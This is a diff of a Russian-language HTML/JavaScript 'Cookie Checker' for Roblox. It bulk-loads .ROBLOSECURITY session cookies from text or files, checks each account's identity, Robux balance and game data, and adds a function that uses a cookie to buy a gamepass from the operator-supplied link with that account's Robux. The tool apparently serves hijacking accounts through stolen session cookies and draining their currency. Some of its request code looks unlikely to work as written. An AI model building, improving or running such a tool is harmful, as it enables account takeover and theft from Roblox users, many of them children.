@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>🍪 Куки Чекер</title>
     <style>
+        /* ===== БАЗА ===== */
         * {
             margin: 0;
             padding: 0;
@@ -23,6 +24,7 @@
             position: relative;
         }
 
+        /* ===== ФОН ===== */
         .bg {
             position: fixed;
             inset: 0;
@@ -33,28 +35,30 @@
                 linear-gradient(145deg, #080c08 0%, #0d180d 50%, #080c08 100%);
         }
 
-        .glow-points {
+        /* ===== ЧАСТИЦЫ ===== */
+        .particles {
             position: fixed;
             inset: 0;
             z-index: 0;
             pointer-events: none;
             overflow: hidden;
         }
-        .glow-point {
+        .particle {
             position: absolute;
             border-radius: 50%;
-            background: radial-gradient(circle, rgba(0, 255, 120, 0.12), transparent 70%);
-            animation: floatGlow 15s infinite alternate ease-in-out;
+            background: radial-gradient(circle, rgba(0, 255, 120, 0.08), transparent 70%);
+            animation: floatParticle 18s infinite alternate ease-in-out;
         }
-        .glow-point:nth-child(1) { width: 200px; height: 200px; top: 10%; left: 5%; animation-duration: 18s; }
-        .glow-point:nth-child(2) { width: 150px; height: 150px; top: 60%; right: 5%; animation-duration: 22s; animation-delay: 2s; }
-        .glow-point:nth-child(3) { width: 100px; height: 100px; bottom: 10%; left: 40%; animation-duration: 16s; animation-delay: 4s; }
+        .particle:nth-child(1) { width: 180px; height: 180px; top: 5%; left: 3%; animation-duration: 20s; }
+        .particle:nth-child(2) { width: 120px; height: 120px; top: 55%; right: 3%; animation-duration: 24s; animation-delay: 2s; }
+        .particle:nth-child(3) { width: 80px; height: 80px; bottom: 8%; left: 35%; animation-duration: 16s; animation-delay: 4s; }
 
-        @keyframes floatGlow {
-            0%   { transform: translate(0, 0) scale(1); opacity: 0.3; }
-            100% { transform: translate(40px, -60px) scale(1.8); opacity: 0.8; }
+        @keyframes floatParticle {
+            0%   { transform: translate(0, 0) scale(1); opacity: 0.2; }
+            100% { transform: translate(50px, -70px) scale(1.6); opacity: 0.7; }
         }
 
+        /* ===== КОНТЕЙНЕР ===== */
         .main {
             position: relative;
             z-index: 1;
@@ -65,10 +69,11 @@
             align-items: center;
         }
 
+        /* ===== ЗАГОЛОВОК С АНИМАЦИЕЙ ===== */
         .header {
             text-align: center;
             width: 100%;
-            transition: all 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+            transition: all 0.9s cubic-bezier(0.16, 1, 0.3, 1);
             margin-bottom: 2rem;
         }
 
@@ -89,6 +94,7 @@
             margin-bottom: 2rem;
         }
 
+        /* ===== ЛОГОТИП ===== */
         .logo {
             font-size: 4rem;
             font-weight: 900;
@@ -165,6 +171,7 @@
             100% { opacity: 1; transform: translateY(0); }
         }
 
+        /* ===== КАРТОЧКА ===== */
         .card {
             width: 100%;
             background: rgba(12, 22, 12, 0.85);
@@ -183,14 +190,48 @@
             100% { opacity: 1; transform: translateY(0); }
         }
 
+        /* ===== ВСТАВКА КУКИ ТЕКСТОМ ===== */
+        .cookie-input-area {
+            margin-bottom: 1.2rem;
+        }
+        .cookie-input-area label {
+            color: #8aaa8a;
+            font-size: 0.85rem;
+            display: block;
+            margin-bottom: 0.3rem;
+        }
+        .cookie-input-area textarea {
+            width: 100%;
+            padding: 0.8rem 1rem;
+            border-radius: 14px;
+            border: 1px solid rgba(0, 255, 120, 0.12);
+            background: rgba(0, 255, 80, 0.03);
+            color: #d0f0d0;
+            font-size: 0.85rem;
+            font-family: monospace;
+            resize: vertical;
+            min-height: 60px;
+            transition: 0.3s;
+        }
+        .cookie-input-area textarea:focus {
+            outline: none;
+            border-color: rgba(0, 255, 120, 0.3);
+            box-shadow: 0 0 20px rgba(0, 255, 120, 0.05);
+        }
+        .cookie-input-area textarea::placeholder {
+            color: #4a6a4a;
+        }
+
+        /* ===== ЗОНА ЗАГРУЗКИ ===== */
         .drop-zone {
             border: 2px dashed rgba(0, 255, 120, 0.15);
             border-radius: 18px;
-            padding: 2rem 1.5rem;
+            padding: 1.5rem;
             text-align: center;
             cursor: pointer;
             transition: 0.35s;
             background: rgba(0, 255, 80, 0.02);
+            margin-bottom: 1rem;
         }
         .drop-zone:hover {
             border-color: rgba(0, 255, 120, 0.40);
@@ -198,46 +239,47 @@
             transform: scale(1.01);
         }
         .drop-zone .icon {
-            font-size: 2.8rem;
+            font-size: 2.4rem;
             display: block;
-            margin-bottom: 0.3rem;
+            margin-bottom: 0.2rem;
         }
         .drop-zone p {
             color: #b0d0b0;
-            font-size: 1rem;
+            font-size: 0.95rem;
         }
         .drop-zone .hint {
             color: #4a6a4a;
-            font-size: 0.8rem;
-            margin-top: 0.3rem;
+            font-size: 0.75rem;
+            margin-top: 0.2rem;
         }
         .drop-zone input {
             display: none;
         }
 
+        /* ===== ФАЙЛЫ ===== */
         .file-list {
             display: flex;
             flex-wrap: wrap;
-            gap: 0.6rem;
-            margin: 1rem 0 0.5rem;
-            min-height: 2.4rem;
+            gap: 0.5rem;
+            margin: 0.5rem 0;
+            min-height: 2rem;
         }
         .file-tag {
             background: rgba(0, 255, 80, 0.06);
             border: 1px solid rgba(0, 255, 120, 0.10);
-            padding: 0.3rem 1rem 0.3rem 1.2rem;
+            padding: 0.25rem 1rem 0.25rem 1.2rem;
             border-radius: 40px;
-            font-size: 0.85rem;
+            font-size: 0.8rem;
             color: #b0e0b0;
             display: flex;
             align-items: center;
-            gap: 0.6rem;
+            gap: 0.5rem;
         }
         .file-tag button {
             background: none;
             border: none;
             color: #ff6b6b;
-            font-size: 1.2rem;
+            font-size: 1.1rem;
             cursor: pointer;
             padding: 0 0.2rem;
             line-height: 1;
@@ -248,20 +290,22 @@
             transform: scale(1.2);
         }
 
+        /* ===== СТАТУС ===== */
         .status {
-            margin: 0.8rem 0 0.3rem;
-            padding: 0.6rem 1rem;
+            margin: 0.6rem 0 0.3rem;
+            padding: 0.5rem 1rem;
             border-radius: 12px;
             background: rgba(0, 255, 80, 0.02);
             border-left: 3px solid rgba(0, 255, 120, 0.12);
             color: #8aaa8a;
-            font-size: 0.9rem;
-            min-height: 2.6rem;
+            font-size: 0.85rem;
+            min-height: 2.4rem;
             transition: 0.3s;
         }
 
+        /* ===== ПРОГРЕСС ===== */
         .progress-wrap {
-            margin: 0.6rem 0;
+            margin: 0.5rem 0;
             height: 4px;
             background: rgba(255, 255, 255, 0.04);
             border-radius: 4px;
@@ -276,18 +320,19 @@
             transition: width 0.3s ease;
         }
 
+        /* ===== КНОПКИ ===== */
         .btn-group {
             display: flex;
             flex-wrap: wrap;
-            gap: 0.7rem;
-            margin-top: 1.2rem;
+            gap: 0.6rem;
+            margin-top: 1rem;
         }
         .btn {
             border: none;
-            padding: 0.7rem 1.8rem;
+            padding: 0.6rem 1.6rem;
             border-radius: 40px;
             font-weight: 700;
-            font-size: 0.95rem;
+            font-size: 0.9rem;
             cursor: pointer;
             transition: 0.3s;
             background: #1a3a1a;
@@ -315,13 +360,39 @@
         .btn-danger:hover {
             background: rgba(200, 50, 50, 0.22);
         }
+        .btn-success {
+            background: rgba(0, 200, 60, 0.15);
+            color: #40ff80;
+        }
+        .btn-success:hover {
+            background: rgba(0, 200, 60, 0.25);
+        }
+        .btn-warning {
+            background: rgba(200, 180, 0, 0.12);
+            color: #ffd700;
+        }
+        .btn-warning:hover {
+            background: rgba(200, 180, 0, 0.22);
+        }
+        .btn-exit {
+            background: rgba(200, 50, 50, 0.20);
+            color: #ff6b6b;
+            border: 1px solid rgba(200, 50, 50, 0.20);
+        }
+        .btn-exit:hover {
+            background: rgba(200, 50, 50, 0.30);
+        }
 
-        /* ===== РЕЗУЛЬТАТЫ С ИГРАМИ ===== */
+        /* ===== РЕЗУЛЬТАТЫ ===== */
+        .result-container {
+            width: 100%;
+            margin-top: 1.2rem;
+        }
+
         .result-grid {
             display: grid;
             grid-template-columns: 1fr;
             gap: 1rem;
-            margin-top: 1.2rem;
         }
 
         .cookie-card {
@@ -387,8 +458,8 @@
         /* ===== ИГРЫ ===== */
         .games-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-            gap: 0.4rem 1rem;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 0.3rem 1rem;
             margin-top: 0.5rem;
             padding-top: 0.5rem;
             border-top: 1px solid rgba(0, 255, 120, 0.05);
@@ -396,8 +467,8 @@
         .game-item {
             display: flex;
             justify-content: space-between;
-            padding: 0.2rem 0;
-            font-size: 0.8rem;
+            padding: 0.15rem 0;
+            font-size: 0.75rem;
             color: #8aaa8a;
             border-bottom: 1px solid rgba(255, 255, 255, 0.02);
         }
@@ -414,9 +485,9 @@
 
         .cookie-preview {
             color: #3a5a3a;
-            font-size: 0.55rem;
+            font-size: 0.5rem;
             word-break: break-all;
-            margin-top: 0.6rem;
+            margin-top: 0.5rem;
             font-family: monospace;
             max-width: 100%;
             overflow: hidden;
@@ -426,43 +497,130 @@
 
         .result-title {
             color: #80a080;
-            font-size: 0.9rem;
-            margin: 1.2rem 0 0.5rem;
+            font-size: 0.85rem;
+            margin: 0.8rem 0 0.5rem;
             font-weight: 600;
             text-align: center;
         }
 
         .no-games {
             color: #4a6a4a;
-            font-size: 0.8rem;
+            font-size: 0.75rem;
             text-align: center;
-            padding: 0.5rem 0;
+            padding: 0.3rem 0;
         }
 
+        /* ===== GAMEPASS ===== */
+        .gamepass-section {
+            margin-top: 1rem;
+            padding-top: 1rem;
+            border-top: 1px solid rgba(0, 255, 120, 0.08);
+        }
+        .gamepass-section .question {
+            color: #d0f0d0;
+            font-size: 1rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .gamepass-section .question .icon {
+            font-size: 1.4rem;
+        }
+        .gamepass-buttons {
+            display: flex;
+            gap: 0.6rem;
+            margin-top: 0.5rem;
+            flex-wrap: wrap;
+        }
+        .gamepass-input-area {
+            margin-top: 0.8rem;
+            display: none;
+        }
+        .gamepass-input-area.show {
+            display: block;
+        }
+        .gamepass-input-area input {
+            width: 100%;
+            padding: 0.6rem 1rem;
+            border-radius: 12px;
+            border: 1px solid rgba(0, 255, 120, 0.12);
+            background: rgba(0, 255, 80, 0.03);
+            color: #d0f0d0;
+            font-size: 0.85rem;
+            transition: 0.3s;
+        }
+        .gamepass-input-area input:focus {
+            outline: none;
+            border-color: rgba(0, 255, 120, 0.3);
+            box-shadow: 0 0 20px rgba(0, 255, 120, 0.05);
+        }
+        .gamepass-input-area input::placeholder {
+            color: #4a6a4a;
+        }
+        .gamepass-input-area .buy-row {
+            display: flex;
+            gap: 0.6rem;
+            margin-top: 0.5rem;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+        .gamepass-result {
+            margin-top: 0.5rem;
+            padding: 0.5rem 1rem;
+            border-radius: 10px;
+            font-size: 0.85rem;
+            display: none;
+        }
+        .gamepass-result.show {
+            display: block;
+        }
+        .gamepass-result.success {
+            background: rgba(0, 200, 60, 0.10);
+            border: 1px solid rgba(0, 200, 60, 0.20);
+            color: #40ff80;
+        }
+        .gamepass-result.error {
+            background: rgba(200, 50, 50, 0.10);
+            border: 1px solid rgba(200, 50, 50, 0.20);
+            color: #ff6b6b;
+        }
+
+        /* ===== АДАПТИВ ===== */
         @media (max-width: 560px) {
             .logo { font-size: 2.6rem; }
             .card { padding: 1.2rem; }
-            .btn { font-size: 0.85rem; padding: 0.6rem 1.2rem; }
-            .drop-zone { padding: 1.2rem; }
+            .btn { font-size: 0.8rem; padding: 0.5rem 1.2rem; }
+            .drop-zone { padding: 1rem; }
             .drop-zone .icon { font-size: 2rem; }
             .subtitle { font-size: 0.6rem; letter-spacing: 3px; }
             .cookie-card .avatar { width: 44px; height: 44px; }
             .games-grid { grid-template-columns: 1fr 1fr; }
-            .game-item { font-size: 0.7rem; }
+            .game-item { font-size: 0.65rem; }
+            .cookie-input-area textarea { min-height: 40px; font-size: 0.75rem; }
+        }
+
+        @media (max-width: 400px) {
+            .logo { font-size: 2rem; }
+            .card { padding: 0.8rem; }
+            .games-grid { grid-template-columns: 1fr; }
         }
     </style>
 </head>
 <body>
 
+    <!-- ===== ФОН ===== -->
     <div class="bg"></div>
-    <div class="glow-points">
-        <div class="glow-point"></div>
-        <div class="glow-point"></div>
-        <div class="glow-point"></div>
+    <div class="particles">
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
     </div>
 
+    <!-- ===== ОСНОВНОЙ БЛОК ===== -->
     <div class="main">
 
+        <!-- ===== ЗАГОЛОВОК ===== -->
         <div class="header" id="header">
             <div class="logo">
                 <span class="logo-emoji">🍪</span>
@@ -474,29 +632,43 @@
             <div class="subtitle" id="subtitle">✦ ПРОВЕРКА АККАУНТОВ ROBLOX ✦</div>
         </div>
 
+        <!-- ===== КАРТОЧКА ===== -->
         <div class="card" id="card">
 
+            <!-- ===== ВСТАВКА КУКИ ТЕКСТОМ ===== -->
+            <div class="cookie-input-area">
+                <label>📝 Вставьте куку текстом (или несколько, по одной на строку):</label>
+                <textarea id="cookieTextInput" placeholder='_|WARNING:-DO-NOT-SHARE-this-file.-...&#10;или&#10;.ROBLOSECURITY=...'></textarea>
+            </div>
+
+            <!-- ===== ЗОНА ЗАГРУЗКИ ===== -->
             <div class="drop-zone" id="dropZone">
                 <span class="icon">📂</span>
-                <p><strong>Нажмите или перетащите</strong> файлы с куками</p>
-                <div class="hint">.txt · .cookie · до 3 файлов · любое количество кук</div>
+                <p><strong>Или перетащите</strong> файлы с куками</p>
+                <div class="hint">.txt · .cookie · до 3 файлов</div>
                 <input type="file" id="fileInput" multiple />
             </div>
 
+            <!-- ===== СПИСОК ФАЙЛОВ ===== -->
             <div class="file-list" id="fileList"></div>
 
-            <div class="status" id="status">📌 Загрузите файлы с куками Roblox</div>
+            <!-- ===== СТАТУС ===== -->
+            <div class="status" id="status">📌 Вставьте куку или загрузите файл</div>
 
+            <!-- ===== ПРОГРЕСС ===== -->
             <div class="progress-wrap" id="progressWrap">
                 <div class="progress-bar" id="progressBar"></div>
             </div>
 
+            <!-- ===== КНОПКИ ===== -->
             <div class="btn-group">
                 <button class="btn btn-primary" id="checkBtn">🔍 Проверить</button>
                 <button class="btn btn-danger" id="clearBtn">🗑 Очистить</button>
+                <button class="btn btn-exit" id="exitBtn" style="display:none;">🚪 Выйти</button>
             </div>
 
-            <div id="resultContainer"></div>
+            <!-- ===== РЕЗУЛЬТАТЫ ===== -->
+            <div class="result-container" id="resultContainer"></div>
 
         </div>
     </div>
@@ -505,23 +677,31 @@
         (function() {
             'use strict';
 
+            // ===== СОСТОЯНИЕ =====
             let rawFiles = [];
             let allCookies = [];
             let results = [];
             let isChecking = false;
+            let currentSessionCookie = null;
+            let currentUserData = null;
 
+            // ===== DOM =====
             const header = document.getElementById('header');
             const subtitle = document.getElementById('subtitle');
+            const card = document.getElementById('card');
+            const cookieTextInput = document.getElementById('cookieTextInput');
             const fileInput = document.getElementById('fileInput');
             const dropZone = document.getElementById('dropZone');
             const fileList = document.getElementById('fileList');
             const status = document.getElementById('status');
             const checkBtn = document.getElementById('checkBtn');
             const clearBtn = document.getElementById('clearBtn');
+            const exitBtn = document.getElementById('exitBtn');
             const progressWrap = document.getElementById('progressWrap');
             const progressBar = document.getElementById('progressBar');
             const resultContainer = document.getElementById('resultContainer');
 
+            // ===== АНИМАЦИЯ =====
             setTimeout(() => {
                 header.classList.add('moved');
                 subtitle.classList.add('show');
@@ -557,26 +737,9 @@
                 return found;
             }
 
-            // ===== ПАРСИНГ ИГР ИЗ HTML =====
+            // ===== ПАРСИНГ ИГР =====
             function parseGamesFromHTML(html) {
                 const games = {};
-
-                // Ищем секцию с играми на странице профиля
-                // Пробуем найти скрытые данные
-                try {
-                    // Ищем JSON с данными игр
-                    const jsonMatch = html.match(/"games":\s*({[^}]+})/i);
-                    if (jsonMatch) {
-                        const data = JSON.parse('{' + jsonMatch[1] + '}');
-                        for (let key in data) {
-                            if (typeof data[key] === 'number' || typeof data[key] === 'string') {
-                                games[key] = data[key];
-                            }
-                        }
-                    }
-                } catch (e) {}
-
-                // Ищем пары "Игра: значение" в тексте
                 const gamePatterns = [
                     /Blox Fruits[:\s]+(\d+)/i,
                     /Adopt Me[:\s]+(\d+)/i,
@@ -601,7 +764,6 @@
                     /Steal a Brainrot[:\s]+(\d+)/i,
                     /Fish It[:\s]+(\d+)/i,
                 ];
-
                 for (let pattern of gamePatterns) {
                     const match = html.match(pattern);
                     if (match) {
@@ -609,35 +771,7 @@
                         games[name] = parseInt(match[1], 10);
                     }
                 }
-
-                // Ищем в виде "Game: 0 | Game2: 5"
-                const pairs = html.match(/([A-Za-z0-9\s\[\]!]+):\s*(\d+)/g);
-                if (pairs) {
-                    for (let pair of pairs) {
-                        const parts = pair.split(':');
-                        if (parts.length === 2) {
-                            const name = parts[0].trim();
-                            const val = parseInt(parts[1].trim(), 10);
-                            if (name.length > 2 && name.length < 40 && !isNaN(val)) {
-                                // Проверяем что это не стандартные поля
-                                const skipNames = ['Username', 'User ID', 'Balance', 'Donated', 'RAP', 'Pending', 'Billing', 'Cards', 'Premium', 'Mail', 'Groups', 'Badges', 'Passes'];
-                                if (!skipNames.includes(name)) {
-                                    games[name] = val;
-                                }
-                            }
-                        }
-                    }
-                }
-
-                // Удаляем дубликаты и сортируем по убыванию
-                const sorted = {};
-                const keys = Object.keys(games).sort();
-                for (let key of keys) {
-                    if (games[key] !== undefined && games[key] !== null) {
-                        sorted[key] = games[key];
-                    }
-                }
-                return sorted;
+                return games;
             }
 
             // ===== ЗАПРОС К ROOBLOX =====
@@ -671,7 +805,6 @@
                     }
 
                     const data = await response.json();
-                    // Пытаемся получить игры через отдельный запрос
                     let games = {};
                     try {
                         const profileResp = await fetch(`https://www.roblox.com/users/${data.UserID || data.id}/profile`, {
@@ -727,16 +860,93 @@
                 return `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=100&height=100&format=png`;
             }
 
+            // ===== ПОКУПКА GAMEPASS =====
+            async function buyGamepass(cookie, gamepassUrl) {
+                try {
+                    // Извлекаем ID из ссылки
+                    const idMatch = gamepassUrl.match(/\/(\d+)(?:\?|$)/);
+                    if (!idMatch) {
+                        return { success: false, error: 'Неверная ссылка на Gamepass' };
+                    }
+                    const passId = idMatch[1];
+
+                    // Получаем информацию о gamepass
+                    const infoResp = await fetch(`https://www.roblox.com/game-pass/${passId}/`, {
+                        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+                    });
+                    if (!infoResp.ok) {
+                        return { success: false, error: 'Не удалось получить информацию о Gamepass' };
+                    }
+                    const html = await infoResp.text();
+
+                    // Ищем цену
+                    const priceMatch = html.match(/"price":(\d+)/i);
+                    if (!priceMatch) {
+                        return { success: false, error: 'Не удалось определить цену Gamepass' };
+                    }
+                    const price = parseInt(priceMatch[1], 10);
+
+                    // Проверяем баланс
+                    const userResp = await fetch('https://www.roblox.com/mobileapi/userinfo', {
+                        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+                    });
+                    if (!userResp.ok) {
+                        return { success: false, error: 'Не удалось проверить баланс' };
+                    }
+                    const userData = await userResp.json();
+                    const balance = userData.RobuxBalance || 0;
+
+                    if (balance < price) {
+                        return { success: false, error: `Недостаточно Robux! Нужно: ${price}, у вас: ${balance}` };
+                    }
+
+                    // Покупаем
+                    const buyResp = await fetch(`https://www.roblox.com/game-pass/${passId}/purchase`, {
+                        method: 'POST',
+                        headers: {
+                            'Cookie': `.ROBLOSECURITY=${cookie}`,
+                            'Content-Type': 'application/json',
+                            'X-CSRF-TOKEN': 'fetch'
+                        },
+                        body: JSON.stringify({})
+                    });
+
+                    if (!buyResp.ok) {
+                        return { success: false, error: `Ошибка покупки: HTTP ${buyResp.status}` };
+                    }
+
+                    return { success: true, message: 'Gamepass успешно куплен!' };
+                } catch (err) {
+                    return { success: false, error: err.message || 'Ошибка при покупке' };
+                }
+            }
+
             // ===== ОБНОВЛЕНИЕ ИНТЕРФЕЙСА =====
-            function rebuildCookies() {
-                allCookies = [];
+            function getCookiesFromInputs() {
+                const all = [];
+                // Из текстового поля
+                const text = cookieTextInput.value;
+                if (text.trim()) {
+                    const cookies = extractCookies(text);
+                    all.push(...cookies);
+                }
+                // Из файлов
                 for (let f of rawFiles) {
                     const cookies = extractCookies(f.content);
-                    allCookies.push(...cookies);
+                    all.push(...cookies);
                 }
-                allCookies = [...new Set(allCookies)];
-                updateStatus();
-                renderFiles();
+                return [...new Set(all)];
+            }
+
+            function updateStatus() {
+                const cookies = getCookiesFromInputs();
+                const count = cookies.length;
+                if (count === 0) {
+                    status.innerHTML = '📌 Вставьте куку или загрузите файл';
+                } else {
+                    status.innerHTML = `✅ Найдено ${count} кук. Нажмите "Проверить".`;
+                }
+                return cookies;
             }
 
             function renderFiles() {
@@ -744,7 +954,7 @@
                 if (rawFiles.length === 0) {
                     const empty = document.createElement('span');
                     empty.style.color = '#4a6a4a';
-                    empty.style.fontSize = '0.85rem';
+                    empty.style.fontSize = '0.8rem';
                     empty.textContent = 'Нет загруженных файлов';
                     fileList.appendChild(empty);
                     return;
@@ -757,92 +967,202 @@
                     tag.querySelector('button').addEventListener('click', (e) => {
                         const i = parseInt(e.target.dataset.idx, 10);
                         rawFiles.splice(i, 1);
-                        rebuildCookies();
+                        renderFiles();
+                        updateStatus();
                     });
                     fileList.appendChild(tag);
                 });
             }
 
-            function updateStatus() {
-                const count = allCookies.length;
-                if (count === 0) {
-                    status.innerHTML = '📌 Загрузите файлы с куками Roblox';
+            // ===== ОТОБРАЖЕНИЕ РЕЗУЛЬТАТОВ =====
+            function renderResults(data, cookie) {
+                resultContainer.innerHTML = '';
+
+                const card = document.createElement('div');
+                card.className = 'cookie-card';
+
+                let avatarHtml = '';
+                if (data.error) {
+                    avatarHtml = `<div class="avatar placeholder">❌</div>`;
+                } else if (data.userId) {
+                    const avatarUrl = getAvatarUrl(data.userId);
+                    avatarHtml = `<img class="avatar" src="${avatarUrl}" alt="Avatar" loading="lazy" onerror="this.className='avatar placeholder';this.textContent='👤'" />`;
                 } else {
-                    status.innerHTML = `✅ Найдено ${count} кук в ${rawFiles.length} файлах. Нажмите "Проверить".`;
+                    avatarHtml = `<div class="avatar placeholder">👤</div>`;
                 }
-            }
 
-            function renderResults() {
-                if (results.length === 0) {
-                    resultContainer.innerHTML = '';
-                    return;
-                }
-                let html = `<div class="result-title">📊 Результаты (${results.length})</div><div class="result-grid">`;
-
-                for (let r of results) {
-                    let avatarHtml = '';
-                    if (r.error) {
-                        avatarHtml = `<div class="avatar placeholder">❌</div>`;
-                    } else if (r.userId) {
-                        const avatarUrl = getAvatarUrl(r.userId);
-                        avatarHtml = `<img class="avatar" src="${avatarUrl}" alt="Avatar" loading="lazy" onerror="this.className='avatar placeholder';this.textContent='👤'" />`;
-                    } else {
-                        avatarHtml = `<div class="avatar placeholder">👤</div>`;
-                    }
-
-                    let content = '';
-                    if (r.error) {
-                        content = `<div class="error">❌ ${r.error}</div>`;
-                    } else {
-                        let gamesHtml = '';
-                        const gameKeys = Object.keys(r.games || {});
-                        if (gameKeys.length > 0) {
-                            gamesHtml = '<div class="games-grid">';
-                            for (let key of gameKeys) {
-                                const val = r.games[key];
-                                const valClass = val === 0 || val === '0' ? 'game-value zero' : 'game-value';
-                                gamesHtml += `
-                                    <div class="game-item">
-                                        <span class="game-name">${key}</span>
-                                        <span class="${valClass}">${val}</span>
-                                    </div>
-                                `;
-                            }
-                            gamesHtml += '</div>';
-                        } else {
-                            gamesHtml = `<div class="no-games">🎮 Нет данных об играх</div>`;
-                        }
-
-                        content = `
-                            <div class="top-row">
-                                ${avatarHtml}
-                                <div class="user-info">
-                                    <div class="name">${r.displayName || '—'}</div>
-                                    <div class="robux">${r.robux !== undefined && r.robux !== null ? r.robux : '—'} R$</div>
-                                    <div class="user-id">ID: ${r.userId || '—'}</div>
+                let content = '';
+                if (data.error) {
+                    content = `<div class="error">❌ ${data.error}</div>`;
+                } else {
+                    let gamesHtml = '';
+                    const gameKeys = Object.keys(data.games || {});
+                    if (gameKeys.length > 0) {
+                        gamesHtml = '<div class="games-grid">';
+                        for (let key of gameKeys) {
+                            const val = data.games[key];
+                            const valClass = val === 0 || val === '0' ? 'game-value zero' : 'game-value';
+                            gamesHtml += `
+                                <div class="game-item">
+                                    <span class="game-name">${key}</span>
+                                    <span class="${valClass}">${val}</span>
                                 </div>
-                            </div>
-                            ${gamesHtml}
-                        `;
+                            `;
+                        }
+                        gamesHtml += '</div>';
+                    } else {
+                        gamesHtml = `<div class="no-games">🎮 Нет данных об играх</div>`;
                     }
 
-                    html += `
-                        <div class="cookie-card">
-                            ${content}
-                            <div class="cookie-preview">${r.cookie || '...'}</div>
+                    content = `
+                        <div class="top-row">
+                            ${avatarHtml}
+                            <div class="user-info">
+                                <div class="name">${data.displayName || '—'}</div>
+                                <div class="robux">${data.robux !== undefined && data.robux !== null ? data.robux : '—'} R$</div>
+                                <div class="user-id">ID: ${data.userId || '—'}</div>
+                            </div>
+                        </div>
+                        ${gamesHtml}
+                    `;
+
+                    // Сохраняем данные для Gamepass
+                    currentUserData = data;
+                    currentSessionCookie = cookie;
+
+                    // Вопрос про Gamepass
+                    content += `
+                        <div class="gamepass-section">
+                            <div class="question">
+                                <span class="icon">❓</span>
+                                Купить Gamepass?
+                            </div>
+                            <div class="gamepass-buttons">
+                                <button class="btn btn-success" id="gamepassYes">✅ Да</button>
+                                <button class="btn btn-danger" id="gamepassNo">❌ Нет</button>
+                            </div>
+                            <div class="gamepass-input-area" id="gamepassInputArea">
+                                <input type="text" id="gamepassUrlInput" placeholder="https://www.roblox.com/game-pass/1234567/..." />
+                                <div class="buy-row">
+                                    <button class="btn btn-primary" id="gamepassBuyBtn">💎 Купить</button>
+                                    <span style="color:#4a6a4a;font-size:0.8rem;" id="gamepassPriceInfo"></span>
+                                </div>
+                                <div class="gamepass-result" id="gamepassResult"></div>
+                            </div>
                         </div>
                     `;
                 }
 
-                html += '</div>';
-                resultContainer.innerHTML = html;
+                card.innerHTML = `
+                    ${content}
+                    <div class="cookie-preview">${cookie ? cookie.substring(0, 25) + '...' : '...'}</div>
+                `;
+
+                resultContainer.appendChild(card);
+
+                // Обработчики Gamepass
+                const yesBtn = card.querySelector('#gamepassYes');
+                const noBtn = card.querySelector('#gamepassNo');
+                const inputArea = card.querySelector('#gamepassInputArea');
+                const buyBtn = card.querySelector('#gamepassBuyBtn');
+                const urlInput = card.querySelector('#gamepassUrlInput');
+                const resultDiv = card.querySelector('#gamepassResult');
+                const priceInfo = card.querySelector('#gamepassPriceInfo');
+
+                if (yesBtn) {
+                    yesBtn.addEventListener('click', () => {
+                        inputArea.classList.add('show');
+                        resultDiv.classList.remove('show');
+                        resultDiv.className = 'gamepass-result';
+                        priceInfo.textContent = '';
+                        // Пытаемся определить цену
+                        if (urlInput.value) {
+                            checkGamepassPrice(urlInput.value);
+                        }
+                    });
+                }
+
+                if (noBtn) {
+                    noBtn.addEventListener('click', () => {
+                        inputArea.classList.remove('show');
+                        resultDiv.classList.remove('show');
+                        resultDiv.className = 'gamepass-result';
+                    });
+                }
+
+                if (urlInput) {
+                    urlInput.addEventListener('input', () => {
+                        if (urlInput.value) {
+                            checkGamepassPrice(urlInput.value);
+                        } else {
+                            priceInfo.textContent = '';
+                        }
+                    });
+                }
+
+                async function checkGamepassPrice(url) {
+                    try {
+                        const idMatch = url.match(/\/(\d+)(?:\?|$)/);
+                        if (!idMatch) return;
+                        const passId = idMatch[1];
+                        const resp = await fetch(`https://www.roblox.com/game-pass/${passId}/`, {
+                            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+                        });
+                        if (resp.ok) {
+                            const html = await resp.text();
+                            const priceMatch = html.match(/"price":(\d+)/i);
+                            if (priceMatch) {
+                                priceInfo.textContent = `💰 Цена: ${priceMatch[1]} R$`;
+                            }
+                        }
+                    } catch (e) {}
+                }
+
+                if (buyBtn) {
+                    buyBtn.addEventListener('click', async () => {
+                        const url = urlInput.value.trim();
+                        if (!url) {
+                            resultDiv.className = 'gamepass-result show error';
+                            resultDiv.textContent = '⚠️ Введите ссылку на Gamepass';
+                            return;
+                        }
+
+                        resultDiv.className = 'gamepass-result show';
+                        resultDiv.textContent = '⏳ Покупка...';
+                        resultDiv.style.color = '#ffd700';
+
+                        const result = await buyGamepass(cookie, url);
+
+                        if (result.success) {
+                            resultDiv.className = 'gamepass-result show success';
+                            resultDiv.textContent = `✅ ${result.message}`;
+                            // Обновляем баланс
+                            const newData = await checkCookie(cookie);
+                            if (!newData.error) {
+                                currentUserData = newData;
+                                const robuxSpan = card.querySelector('.robux');
+                                if (robuxSpan) {
+                                    robuxSpan.textContent = `${newData.robux || 0} R$`;
+                                }
+                            }
+                        } else {
+                            resultDiv.className = 'gamepass-result show error';
+                            resultDiv.textContent = `❌ ${result.error}`;
+                        }
+                    });
+                }
+
+                // Показываем кнопку выхода
+                exitBtn.style.display = 'inline-block';
             }
 
             // ===== ПРОВЕРКА =====
             async function runCheck() {
                 if (isChecking) return;
-                if (allCookies.length === 0) {
-                    status.innerHTML = '⚠️ Нет кук для проверки. Загрузите файлы.';
+
+                const cookies = getCookiesFromInputs();
+                if (cookies.length === 0) {
+                    status.innerHTML = '⚠️ Нет кук для проверки. Вставьте куку или загрузите файл.';
                     return;
                 }
 
@@ -850,22 +1170,26 @@
                 checkBtn.disabled = true;
                 progressWrap.style.display = 'block';
                 results = [];
-                const total = allCookies.length;
+                resultContainer.innerHTML = '';
+                exitBtn.style.display = 'none';
+
+                const total = cookies.length;
 
                 for (let i = 0; i < total; i++) {
-                    const cookie = allCookies[i];
+                    const cookie = cookies[i];
                     progressBar.style.width = `${((i + 1) / total) * 100}%`;
